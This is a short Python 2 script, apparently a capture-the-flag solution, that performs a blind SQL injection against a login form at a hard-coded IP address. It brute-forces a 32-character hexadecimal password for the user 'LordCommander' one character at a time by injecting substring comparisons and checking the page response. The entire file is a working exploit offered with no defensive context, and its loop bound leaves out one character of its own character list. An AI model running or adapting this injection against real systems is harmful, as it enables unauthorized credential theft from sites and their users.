import urllib
import urllib2
def doinject(payload):
    url = 'http://163.172.176.29/WALL/index.php'
    values = {'life':payload,'soul':'test'}
    values
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    the_page = response.read()
    if (the_page.find("Wrong")>0):
        return True
    else:
        return False
        
wordlist = "0123456789ABCDEFabcdef"
password = ""

for i in range(1,33):
    s=0
    while (s!=21): 
        payload='LordCommander\' and substr(password,1,'+str(i)+')=\''+password+wordlist[s]
        #print payload                
        if doinject(payload):
            #print 'result:'+password+wordlist[s]
            break;
        else:
            s+=1
    password = password+wordlist[s]
    print '[*]RESULT:  '+password
